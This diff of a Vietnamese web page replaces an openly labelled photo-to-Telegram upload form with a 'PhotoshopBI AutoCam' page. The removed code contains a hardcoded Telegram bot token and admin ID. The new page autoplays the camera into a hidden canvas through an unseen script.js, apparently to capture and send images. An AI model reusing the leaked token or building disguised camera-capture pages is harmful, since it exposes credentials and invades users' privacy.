@@ -2,145 +2,21 @@
 <html lang="vi">
 <head>
 <meta charset="UTF-8">
-<title>Upload Ảnh • Gửi Telegram</title>
-
-<style>
-    body {
-        margin: 0;
-        padding: 0;
-        background: linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 100%);
-        font-family: "Segoe UI", Arial;
-        color: white;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
-
-    .container {
-        width: 380px;
-        background: rgba(255, 255, 255, 0.05);
-        padding: 30px;
-        border-radius: 18px;
-        backdrop-filter: blur(12px);
-        box-shadow: 0px 0px 20px rgba(0,0,0,0.5), 0 0 10px #2196f3;
-        text-align: center;
-    }
-
-    h2 {
-        font-weight: 600;
-        font-size: 24px;
-        margin-bottom: 20px;
-        color: #7abbff;
-        text-shadow: 0 0 8px #2196f3;
-    }
-
-    .upload-box {
-        border: 2px dashed #2196f3;
-        padding: 20px;
-        border-radius: 12px;
-        cursor: pointer;
-        transition: 0.3s;
-    }
-    .upload-box:hover {
-        background: rgba(33, 150, 243, 0.1);
-    }
-
-    #preview {
-        margin-top: 15px;
-        width: 100%;
-        border-radius: 12px;
-        display: none;
-        box-shadow: 0 0 12px #2196f3;
-    }
-
-    button {
-        margin-top: 20px;
-        padding: 12px 30px;
-        border: none;
-        border-radius: 10px;
-        background: #2196f3;
-        color: white;
-        font-size: 16px;
-        cursor: pointer;
-        transition: 0.3s;
-        box-shadow: 0 0 12px #2196f3;
-    }
-
-    button:hover {
-        background: #42a5f5;
-        box-shadow: 0 0 16px #42a5f5;
-    }
-
-    .footer {
-        margin-top: 20px;
-        opacity: 0.6;
-        font-size: 13px;
-    }
-</style>
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PhotoshopBI AutoCam</title>
+<link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-<div class="container">
+<h1 class="title">📸 PhotoshopBI – Auto Camera</h1>
 
-    <h2>📤 Upload Ảnh • Gửi Telegram</h2>
-
-    <label class="upload-box">
-        <input type="file" id="imageFile" accept="image/*" style="display: none;" onchange="previewImage()">
-        Chọn ảnh để gửi 📸
-    </label>
-
-    <img id="preview" alt="preview">
-
-    <button onclick="sendImage()">Gửi ảnh đến Telegram</button>
-
-    <div class="footer">© 2025 • Auto Upload Telegram</div>
-
+<div class="camera-box">
+    <video id="camera" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 </div>
 
-<script>
-const BOT_TOKEN = "7981310164:AAHJ-0-RSJQs1y7u7occVGdIBfch45TzHvE";
-const ADMIN_ID  = "6331676184";
+<p id="status">Đang chờ cấp quyền camera...</p>
 
-function previewImage() {
-    const file = document.getElementById("imageFile").files[0];
-    const preview = document.getElementById("preview");
-
-    if (file) {
-        preview.src = URL.createObjectURL(file);
-        preview.style.display = "block";
-    }
-}
-
-async function sendImage() {
-    const fileInput = document.getElementById("imageFile");
-    const file = fileInput.files[0];
-
-    if (!file) {
-        alert("⚠️ Bạn cần chọn ảnh trước!");
-        return;
-    }
-
-    const formData = new FormData();
-    formData.append("chat_id", ADMIN_ID);
-    formData.append("photo", file);
-
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-
-    try {
-        const res = await fetch(url, { method: "POST", body: formData });
-        const data = await res.json();
-
-        console.log(data);
-        alert("✔ Ảnh đã gửi đến Telegram!");
-
-    } catch (err) {
-        alert("❌ Lỗi gửi ảnh!");
-        console.error(err);
-    }
-}
-</script>
-
+<script src="script.js"></script>
 </body>
 </html>
